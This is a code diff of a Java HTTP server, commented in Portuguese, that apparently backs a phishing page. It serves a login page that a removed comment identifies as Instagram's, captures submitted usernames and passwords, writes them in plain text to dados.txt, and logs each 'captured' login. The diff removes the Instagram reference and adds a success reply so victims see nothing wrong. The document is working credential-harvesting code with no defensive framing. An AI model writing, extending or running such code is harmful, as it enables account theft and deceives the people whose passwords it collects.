@@ -33,7 +33,7 @@ class ServidorHandler implements HttpHandler {
         // Pega o caminho exato que o usuário acessou
         String caminho = troca.getRequestURI().getPath();
 
-        // 1. Se acessar a raiz (/), entrega o arquivo HTML da tela de login do Instagram
+       
         if("/".equals(caminho)){
             File arquivoHtml = new File("src/public/index.html");
             byte[] bytes = Files.readAllBytes(arquivoHtml.toPath());
@@ -42,7 +42,7 @@ class ServidorHandler implements HttpHandler {
             OutputStream fluxoSaida = troca.getResponseBody();
             fluxoSaida.write(bytes);
             fluxoSaida.close();
-        } 
+        }
         // 2. Se enviar o formulário para (/login) usando o método POST vindo do HTML
         else if("/login".equals(caminho) && "POST".equalsIgnoreCase(troca.getRequestMethod())){
             // Prepara o leitor para traduzir e ler os dados enviados pelo formulário
@@ -79,17 +79,24 @@ class ServidorHandler implements HttpHandler {
             try (FileWriter arquivo = new FileWriter("dados.txt", true);
                  BufferedWriter escritor = new BufferedWriter(arquivo);
                  PrintWriter pw = new PrintWriter(escritor)) {
-                
+
                 // Escreve as informações no arquivo com o println
                 pw.println("Usuário: " + usuario + " | Senha: " + senha);
                 System.out.println(">>> Login capturado e salvo: " + usuario);
-                
+
             } catch(Exception erro){
                 System.err.println("ERRO AO SALVAR TXT: " + erro);
                 erro.printStackTrace();
             }
 
-          
+            // Responde ao navegador para a requisição não ficar pendurada
+            String resposta = "Login recebido com sucesso!";
+            byte[] respostaBytes = resposta.getBytes(StandardCharsets.UTF_8);
+            troca.getResponseHeaders().set("Content-Type", "text/plain; charset=UTF-8");
+            troca.sendResponseHeaders(200, respostaBytes.length);
+            OutputStream respostaStream = troca.getResponseBody();
+            respostaStream.write(respostaBytes);
+            respostaStream.close();
         }
     }
 }
